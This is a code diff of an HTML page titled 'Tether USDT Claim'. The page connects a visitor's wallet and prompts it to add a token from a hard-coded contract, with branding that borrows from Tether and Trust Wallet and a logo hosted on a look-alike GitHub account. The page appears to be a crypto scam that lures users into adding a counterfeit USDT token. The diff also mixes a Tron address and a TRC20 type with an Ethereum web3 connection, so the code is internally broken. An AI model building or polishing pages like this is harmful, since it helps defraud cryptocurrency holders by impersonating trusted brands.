@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Tether USDT Claim</title>
-    <script src="https://cdn.jsdelivr.net/npm/@tronweb/tronweb@latest/dist/tronweb.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
     <style>
         body {
             font-family: 'Helvetica Neue', Arial, sans-serif;
@@ -32,7 +32,7 @@
         }
         h1 {
             font-size: 2.2em;
-            color: #f7931a; /* رنگ نارنجی تتر */
+            color: #f7931a;
             margin-bottom: 10px;
             font-weight: 700;
         }
@@ -42,7 +42,7 @@
             color: #666;
         }
         button {
-            background-color: #f7931a; /* نارنجی تتر */
+            background-color: #f7931a;
             color: #fff;
             border: none;
             padding: 12px 30px;
@@ -85,8 +85,8 @@
     </div>
 
     <script>
-        const contractAddress = "TNvrB8QfGowmCNvXYFJuTZQ1DuGNj1eq22"; // آدرس قراردادت
-        const logoUrl = "https://raw.githubusercontent.com/Trustwallet000-design/Wallet/refs/heads/main/tether-logo.png"; // لوگوی آپلودشده (اسم کاربریت رو عوض کن)
+        const contractAddress = "TNvrB8QfGowmCNvXYFJuTZQ1DuGNj1eq22";
+        const logoUrl = "https://raw.githubusercontent.com/Trustwallet000-design/Wallet/refs/heads/main/tether-logo.png";
         const abi = [
             {"stateMutability": "Nonpayable", "type": "Constructor"},
             {"anonymous": false, "inputs": [{"indexed": true, "name": "owner", "type": "address"}, {"indexed": true, "name": "spender", "type": "address"}, {"indexed": false, "name": "value", "type": "uint256"}], "name": "Approval", "type": "Event"},
@@ -103,26 +103,18 @@
         ];
 
         async function connectWallet() {
-            if (window.tronWeb || window.ethereum) {
+            if (window.ethereum) {
                 try {
-                    let tronWeb;
-                    if (window.tronWeb) {
-                        tronWeb = window.tronWeb; // استفاده از TronLink
-                    } else if (window.ethereum) {
-                        tronWeb = new TronWeb({
-                            fullHost: 'https://api.trongrid.io',
-                        });
-                        await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    }
-                    const accounts = await tronWeb.trx.getAccount();
-                    const address = accounts.address;
-                    const userAddress = tronWeb.address.fromHex(address);
+                    const web3 = new Web3(window.ethereum);
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const accounts = await web3.eth.getAccounts();
+                    const address = accounts[0];
                     const status = document.getElementById('status');
-                    status.innerText = `Wallet Connected! Address: ${userAddress.substring(0, 6)}...${userAddress.slice(-4)}`;
+                    status.innerText = `Wallet Connected! Address: ${address.substring(0, 6)}...${address.slice(-4)}`;
                     status.className = 'show';
 
                     // پیشنهاد اضافه کردن توکن با متادیتا
-                    await tronWeb.request({
+                    await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
                             type: 'TRC20',
@@ -142,7 +134,7 @@
                 }
             } else {
                 const status = document.getElementById('status');
-                status.innerText = "Please install Trust Wallet or TronLink!";
+                status.innerText = "Please install Trust Wallet!";
                 status.className = 'show error';
             }
         }
